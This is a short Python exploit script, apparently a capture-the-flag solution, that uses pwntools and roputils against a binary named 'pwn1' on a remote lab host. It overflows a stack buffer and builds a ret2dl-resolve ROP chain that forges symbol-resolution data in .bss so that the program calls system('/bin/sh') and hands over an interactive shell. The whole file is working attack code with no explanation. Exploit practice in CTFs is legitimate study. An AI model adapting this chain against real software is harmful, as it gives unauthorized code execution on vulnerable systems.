import sys
import roputils
from pwn import *

offset = 0x28 + 0x4
readplt = 0x08048390
bss = 0x0804a040
vulFunc = 0x0804852d

p = remote('c346dfd9093dd09cc714320ffb41ab76.kr-lab.com', 56833)
context.log_level = 'debug'

def getReloc(elf, base):
    jmprel = elf.dynamic('JMPREL')
    relent = elf.dynamic('RELENT')
    addr_reloc, padlen_reloc = elf.align(base, jmprel, relent)
    reloc_offset = addr_reloc - jmprel
    return reloc_offset

rop = roputils.ROP('./pwn1')
addr_bss = rop.section('.bss')

buf1 = 'A' * offset
buf1 += p32(readplt) + p32(vulFunc) + p32(0) + p32(addr_bss) + p32(100)
p.send(buf1)

buf2 = rop.string('/bin/sh')
buf2 += rop.fill(20, buf2)
buf2 += rop.dl_resolve_data(addr_bss+20, 'system')
buf2 += rop.fill(100, buf2)
p.send(buf2)

buf3 = 'A' * offset + rop.dl_resolve_call(addr_bss+20, addr_bss)
p.sendline(buf3)
p.recv()
p.interactive()
